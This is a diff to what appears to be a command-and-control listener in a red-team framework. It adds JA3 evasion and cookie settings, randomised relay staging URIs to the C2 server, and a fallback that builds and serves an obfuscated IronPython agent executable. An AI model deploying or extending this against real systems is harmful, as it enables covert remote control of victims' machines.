@@ -125,7 +125,7 @@ class Listener:
             "Cookie": {
                 "Description": "Custom Cookie Name",
                 "Required": False,
-                "Value": "",
+                "Value": "session",
             },
             "JA3_Evasion": {
                 "Description": "Randomly generate a JA3/S signature using TLS ciphers.",
@@ -1109,7 +1109,7 @@ class ExtendedPacketHandler(PacketHandler):
         return response
 
     def send_staging_for_child(self, received_data, hop_name):
-        postURI = self.server + "/login/process.php"
+        postURI = self.server + random.sample({profile.post.client.uris!s}, 1)[0]
         self.headers['Hop-Name'] = hop_name
         decoded_data = base64.b64decode(received_data[1:].encode('UTF-8'))
         response = (urllib.request.urlopen(urllib.request.Request(postURI, decoded_data, self.headers))).read()
@@ -1424,14 +1424,24 @@ class ExtendedPacketHandler(PacketHandler):
                 if implementation is profile.stager and request.method == "POST":
                     # stage 1 negotiation comms are hard coded, so we can't use malleable
                     agentInfo = malleableRequest.body
+                    self.instance_log.debug(
+                        f"{listenerName}: extracted agentInfo from raw body, len={len(agentInfo) if agentInfo else 0}"
+                    )
                 elif implementation is profile.post:
                     # the post implementation has two spots for data, requires two-part extraction
                     agentInfo, output = implementation.extract_client(malleableRequest)
                     agentInfo = (agentInfo if agentInfo else b"") + (
                         output if output else b""
                     )
+                    self.instance_log.debug(
+                        f"{listenerName}: extracted agentInfo from post (two-part), len={len(agentInfo)}"
+                    )
                 else:
                     agentInfo = implementation.extract_client(malleableRequest)
+                    self.instance_log.debug(
+                        f"{listenerName}: extracted agentInfo via extract_client(), len={len(agentInfo) if agentInfo else 0}"
+                    )
+
                 if agentInfo:
                     agentInfo = listener_util.ensure_raw_bytes(agentInfo)
                     dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
@@ -1689,6 +1699,28 @@ class ExtendedPacketHandler(PacketHandler):
                             malleableResponse.code,
                             malleableResponse.headers,
                         )
+
+                else:
+                    # If no agentinfo then attempt to send ironpython agent
+                    with SessionLocal.begin() as db:
+                        obfuscation_config = (
+                            self.mainMenu.obfuscationv2.get_obfuscation_config(
+                                db, "csharp"
+                            )
+                        )
+                        obfuscation = obfuscation_config.enabled
+                        launcher = self.mainMenu.stagergenv2.generate_launcher(
+                            listener_name=listenerName,
+                            language="python",
+                            encode=False,
+                            obfuscate=obfuscation,
+                        )
+
+                    directory = self.mainMenu.stagergenv2.generate_python_exe(
+                        launcher, dot_net_version="net40", obfuscate=obfuscation
+                    )
+                    with open(directory, "rb") as f:
+                        return f.read()
 
                 # log invalid request
                 message = (
